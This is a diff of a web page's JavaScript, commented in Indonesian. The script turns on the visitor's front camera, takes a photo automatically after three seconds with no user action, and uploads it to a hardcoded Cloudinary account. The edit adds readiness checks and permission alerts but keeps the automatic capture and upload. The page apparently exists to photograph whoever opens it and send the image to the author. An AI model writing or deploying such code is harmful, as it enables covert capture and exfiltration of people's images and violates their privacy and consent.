@@ -46,34 +46,43 @@
         const preview = document.getElementById('preview');
         const ctx = canvas.getContext('2d');
 
-        // 1. AKTIFKAN KAMERA DEPAN
+        // 1. MINTA IZIN KAMERA SEBELUM MENGGUNAKAN
         navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
             .then(stream => {
                 video.srcObject = stream;
-                console.log("Kamera berhasil diakses.");
+                video.onloadedmetadata = () => {
+                    console.log("Kamera siap, mengambil foto dalam 3 detik...");
+                    setTimeout(takePhoto, 3000);
+                };
             })
-            .catch(err => console.error("Akses kamera ditolak!", err));
+            .catch(err => {
+                console.error("Akses kamera ditolak!", err);
+                alert("Izin kamera diperlukan untuk mengambil foto.");
+            });
 
-        // 2. AMBIL FOTO OTOMATIS SETELAH 3 DETIK
-        setTimeout(() => {
+        // 2. AMBIL FOTO SETELAH KAMERA SIAP
+        function takePhoto() {
+            if (video.videoWidth === 0 || video.videoHeight === 0) {
+                console.error("Kamera tidak siap!");
+                alert("Kamera belum siap, coba lagi.");
+                return;
+            }
+
             console.log("Mengambil foto...");
-            canvas.width = 600;  // Ukuran lebih kecil untuk kompresi
+            canvas.width = 600;  
             canvas.height = 800;
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            preview.src = canvas.toDataURL("image/jpeg", 0.6);  // Kompres ke JPEG 60%
+            preview.src = canvas.toDataURL("image/jpeg", 0.6);  
             console.log("Foto berhasil diambil.");
 
-            // 3. KOMPREESI FOTO SEBELUM UPLOAD
-            canvas.toBlob(blob => {
-                uploadToCloudinary(blob);
-            }, "image/jpeg", 0.6);
-        }, 3000);
+            canvas.toBlob(uploadToCloudinary, "image/jpeg", 0.6);
+        }
 
-        // 4. FUNGSI UPLOAD KE CLOUDINARY
+        // 3. FUNGSI UPLOAD KE CLOUDINARY
         function uploadToCloudinary(imageBlob) {
-            let cloudName = "dl5dswv7q";  // Ganti dengan Cloud Name kamu
-            let uploadPreset = "tikontol";  // Ganti dengan Upload Preset kamu
+            let cloudName = "dl5dswv7q";  
+            let uploadPreset = "tikontol";  
 
             console.log("Mengunggah foto ke Cloudinary...");
             
